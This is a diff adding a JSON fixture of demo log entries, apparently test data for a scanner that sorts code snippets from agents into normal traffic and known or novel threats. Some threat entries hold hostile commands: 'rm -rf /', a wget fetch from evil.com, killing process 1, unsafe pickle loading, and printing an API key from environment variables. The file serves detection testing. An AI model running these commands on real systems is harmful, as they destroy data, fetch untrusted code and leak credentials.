@@ -1,0 +1,128 @@
+[
+    {
+        "timestamp": "2026-02-07T10:00:00",
+        "agent_id": "DEMO-01",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "print('System check initialized')",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:05",
+        "agent_id": "DEMO-02",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "import math",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:10",
+        "agent_id": "DEMO-03",
+        "type": "KNOWN_THREAT",
+        "code_snippet": "rm -rf /",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:15",
+        "agent_id": "DEMO-04",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "def calculate_metric(a, b): return a * b / 2",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:20",
+        "agent_id": "DEMO-05",
+        "type": "NOVEL_THREAT",
+        "code_snippet": "import os; os.kill(1, 9)",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:25",
+        "agent_id": "DEMO-06",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "x = 42",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:30",
+        "agent_id": "DEMO-07",
+        "type": "KNOWN_THREAT",
+        "code_snippet": "wget http://evil.com/script.sh",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:35",
+        "agent_id": "DEMO-08",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "user_input = input('Enter name: ')",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:40",
+        "agent_id": "DEMO-09",
+        "type": "NOVEL_THREAT",
+        "code_snippet": "import pickle; pickle.loads(malicious_data)",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:45",
+        "agent_id": "DEMO-10",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "import json",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:50",
+        "agent_id": "DEMO-11",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "data = [x*2 for x in range(10)]",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:00:55",
+        "agent_id": "DEMO-12",
+        "type": "KNOWN_THREAT",
+        "code_snippet": "socket.connect(('1.1.1.1', 80))",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:01:00",
+        "agent_id": "DEMO-13",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "class SessionManager: pass",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:01:05",
+        "agent_id": "DEMO-14",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "import time; time.sleep(1)",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:01:10",
+        "agent_id": "DEMO-15",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "config = {'debug': False, 'version': 1.0}",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:01:15",
+        "agent_id": "DEMO-16",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "import os",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:01:20",
+        "agent_id": "DEMO-17",
+        "type": "NORMAL_TRAFFIC",
+        "code_snippet": "key_part = 'GEMINI'",
+        "scanned": false
+    },
+    {
+        "timestamp": "2026-02-07T10:01:25",
+        "agent_id": "DEMO-18",
+        "type": "NOVEL_THREAT",
+        "code_snippet": "print(os.environ[key_part + '_API_KEY'])",
+        "scanned": false
+    }
+]
